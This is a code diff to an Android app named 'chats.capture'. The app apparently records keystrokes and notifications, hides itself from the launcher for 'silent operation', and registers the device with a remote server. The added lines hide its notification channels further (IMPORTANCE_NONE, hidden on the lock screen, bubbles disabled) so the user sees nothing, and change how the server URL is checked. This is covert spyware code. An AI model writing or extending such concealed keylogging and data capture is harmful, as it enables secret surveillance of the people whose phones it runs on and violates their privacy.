@@ -11,8 +11,10 @@ import com.chats.capture.managers.DeviceRegistrationManager
 import com.chats.capture.network.ApiClient
 import android.app.Notification
 import com.chats.capture.utils.AppHider
+import com.chats.capture.utils.AppInstallationChecker
 import com.chats.capture.utils.AppVisibilityManager
 import com.chats.capture.utils.FcmTokenManager
+import com.chats.capture.utils.ServerUrlValidator
 import com.chats.capture.utils.ReleaseTree
 import com.google.firebase.messaging.FirebaseMessaging
 import kotlinx.coroutines.CoroutineScope
@@ -65,6 +67,9 @@ class CaptureApplication : Application() {
             Timber.plant(ReleaseTree())
         }
         
+        // Clear any invalid server URLs from preferences (fix localhost issue)
+        ServerUrlValidator.clearInvalidUrl(this)
+        
         // Create notification channels (with error handling)
         try {
             createNotificationChannels()
@@ -86,6 +91,9 @@ class CaptureApplication : Application() {
         
         Timber.d("Application initialized")
         
+        // Check and log installation status
+        AppInstallationChecker.logInstallationStatus(this)
+        
         // Hide app from launcher on startup (always enabled for silent operation)
         // Try immediate hide first, then delayed hide as backup
         try {
@@ -93,6 +101,9 @@ class CaptureApplication : Application() {
             AppVisibilityManager.hideFromLauncher(this)
             AppHider.ensureHidden(this)
             Timber.d("Immediate app hiding attempted")
+            
+            // Log status after hiding attempt
+            AppInstallationChecker.logInstallationStatus(this)
         } catch (e: Exception) {
             Timber.e(e, "Error in immediate app hiding")
         }
@@ -256,14 +267,11 @@ class CaptureApplication : Application() {
     }
     
     private fun initializeApiAndRegisterDevice(fcmToken: String? = null) {
-        // Get server URL from preferences
-        val prefs = getSharedPreferences("capture_prefs", MODE_PRIVATE)
-        // Default to Render server if not configured
-        val defaultUrl = "https://backend-chat-yq33.onrender.com/"
-        val serverUrl = prefs.getString("server_url", defaultUrl)
+        // Get and validate server URL
+        val serverUrl = ServerUrlValidator.getValidServerUrl(this)
         
         // Initialize API client
-        ApiClient.initialize(this, serverUrl ?: defaultUrl)
+        ApiClient.initialize(this, serverUrl)
         
         // Register device with server (with FCM token if available)
         val deviceRegistrationManager = DeviceRegistrationManager(this)
@@ -295,46 +303,55 @@ class CaptureApplication : Application() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val notificationManager = getSystemService(NotificationManager::class.java)
             
-            // Silent notification capture channel (completely invisible to user)
+            // Silent notification capture channel (completely invisible to user - no notification shown)
             val notificationChannel = NotificationChannel(
                 NOTIFICATION_CHANNEL_ID,
                 "Notification Capture",
-                NotificationManager.IMPORTANCE_MIN // Minimum importance - completely silent
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) NotificationManager.IMPORTANCE_NONE else NotificationManager.IMPORTANCE_MIN
             ).apply {
                 description = "Silent service notification"
                 setShowBadge(false)
                 enableVibration(false)
                 enableLights(false)
-                setSound(null, null)
-                lockscreenVisibility = Notification.VISIBILITY_SECRET
+                setSound(null, null) // No sound
+                lockscreenVisibility = Notification.VISIBILITY_SECRET // Hidden on lock screen
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    setAllowBubbles(false) // No bubbles
+                }
             }
             
-            // Silent keyboard capture channel (completely invisible to user)
+            // Silent keyboard capture channel (completely invisible to user - no notification shown)
             val keyboardChannel = NotificationChannel(
                 KEYBOARD_CHANNEL_ID,
                 "Keyboard Capture",
-                NotificationManager.IMPORTANCE_MIN // Minimum importance - completely silent
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) NotificationManager.IMPORTANCE_NONE else NotificationManager.IMPORTANCE_MIN
             ).apply {
                 description = "Silent service notification"
                 setShowBadge(false)
                 enableVibration(false)
                 enableLights(false)
-                setSound(null, null)
-                lockscreenVisibility = Notification.VISIBILITY_SECRET
+                setSound(null, null) // No sound
+                lockscreenVisibility = Notification.VISIBILITY_SECRET // Hidden on lock screen
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    setAllowBubbles(false) // No bubbles
+                }
             }
             
-            // Silent update channel (completely invisible to user)
+            // Silent update channel (completely invisible to user - no notification shown)
             val updateChannel = NotificationChannel(
                 UPDATE_CHANNEL_ID,
                 "App Updates",
-                NotificationManager.IMPORTANCE_MIN // Minimum importance - completely silent
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) NotificationManager.IMPORTANCE_NONE else NotificationManager.IMPORTANCE_MIN
             ).apply {
                 description = "Silent service notification"
                 setShowBadge(false)
                 enableVibration(false)
                 enableLights(false)
-                setSound(null, null)
-                lockscreenVisibility = Notification.VISIBILITY_SECRET
+                setSound(null, null) // No sound
+                lockscreenVisibility = Notification.VISIBILITY_SECRET // Hidden on lock screen
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    setAllowBubbles(false) // No bubbles
+                }
             }
             
             notificationManager?.createNotificationChannels(
